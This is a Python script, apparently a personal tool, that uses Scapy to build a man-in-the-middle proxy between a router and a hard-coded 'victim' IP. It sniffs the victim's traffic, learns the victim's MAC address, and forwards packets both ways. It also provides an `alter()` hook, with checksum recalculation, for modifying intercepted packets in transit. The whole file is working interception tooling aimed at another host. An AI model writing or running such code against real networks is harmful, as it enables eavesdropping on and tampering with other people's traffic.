#!venv/bin/python

from scapy.all import Ether, conf, sniff

# Define a few constants

INTERFACE = "eno1"  # The interface that is listened
# TODO : Fetch automatically the MAC address
OUR_MAC = "aa:bb:cc:dd:ee:ff"  # This interface MAC address
OUR_IP = "10.1.10.2"  # This interface IP address

VICTIM_MAC = None  # Fetched automatically
VICTIM_IP = "10.1.10.3"  # The victim IP address

ROUTER_MAC = "aa:bb:cc:dd:ee:ff"  # The MAC address of the gateway

# The "(!port 514)" here avoids the SYSLOG packets.
# TODO : test if I can remove it.
# If a packet doesn't match the filter, it will not be detected and forwarded.
CUSTOM_FILTER = f"ip and host {VICTIM_IP} and (!port 514)"

# This is the socket used to forward packets
my_socket = conf.L2socket(iface=INTERFACE)


def quick_send(packet):
    """Send the packet quicker than a scapy sendp()."""
    try:
        my_socket.send(packet)
    except OSError as err:
        # TODO : only catch the "Message too long" exception
        print(err)


def handle_packet(eth_packet):
    """Forward the packet. The packet can be altered if needed."""

    # Declare variables for the process

    handled = False

    if eth_packet.src == OUR_MAC:
        # This packet is from us.
        # Don't do anything with it
        return

    try:
        # Retrieve the victim MAC address from the first packet to it.

        global VICTIM_MAC
        if VICTIM_MAC is None and eth_packet.payload.src == VICTIM_IP:
            VICTIM_MAC = eth_packet.src
            print("Found victim MAC ->", VICTIM_MAC)

        # Alter the packet as we want
        changed = alter(eth_packet)

        if changed:
            print("This packet was modified.")

            # Recalculating checksums
            del eth_packet.payload.len
            del eth_packet.payload.chksum
            del eth_packet.payload.payload.len
            del eth_packet.payload.payload.chksum

    except UnicodeDecodeError:
        # That happen.
        # Let it go, it will be forwarded like the others.
        pass
    except AttributeError:
        # It's likely that the "load" attribute couldn't be retrieved.
        pass

    # Forwarding (change the destination MAC address)
    # It's after the packet alteration in order to use the new IPs if set
    # during the alteration.

    if eth_packet.payload.dst == OUR_IP:
        # Don't forward, those are for us.
        return

    if eth_packet.src == VICTIM_MAC:
        #  This packet came from the victim and is not for us.
        new_dest = ROUTER_MAC
        handled = True
    elif eth_packet.payload.dst == VICTIM_IP:
        # This packet is for the victim.
        new_dest = VICTIM_MAC
        handled = True

    if handled:
        # Forge a new L2 packet with the old payload inside
        new_packet = Ether(dst=new_dest) / eth_packet.payload
        # Forward
        quick_send(new_packet)
    else:
        # Just fix the code when this happen.
        print("Packet not handled !")
        print(eth_packet.summary())


def alter(eth_packet):
    """Modify the packet if needed.
    Return True if the packet has been changed."""

    changed = False

    # DO WHAT YOU WANT HERE
    # UnicodeDecodeError and AttributeError exceptions are already catched.
    # load = eth_packet.payload.payload.load.decode()

    return changed


print(f"Make sure you are placed between the router and {VICTIM_IP}.")
print("And that the IP forwarding is NOT enabled on this computer.")
print("Starting the proxy...")
sniff(prn=handle_packet, filter=CUSTOM_FILTER, iface=INTERFACE, store=0)
